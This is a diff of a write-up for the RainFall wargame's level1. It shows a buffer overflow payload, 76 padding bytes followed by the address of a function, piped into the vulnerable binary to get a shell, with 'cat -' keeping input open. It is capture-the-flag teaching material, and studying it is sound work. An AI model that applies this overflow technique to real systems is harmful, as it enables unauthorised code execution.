@@ -180,12 +180,15 @@ So, I guess 'A' * 76 + [address_of_run = **0x08048444**]
 ```
 rainfall git:(main) ✗ python -c 'print "A" * 76 + "\x44\x84\x04\x08"'
 ```
+trying it
+```
 level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/tfou
 level1@RainFall:~$ cat /tmp/tfou | ./level1 
 Good... Wait what?
 Segmentation fault (core dumped)
 ```
-found that **cat -** is used to block input 
+found that **cat -** is used to block input
+```
 level1@RainFall:~$ cat /tmp/tfou -| ./level1 
 Good... Wait what?
 ls
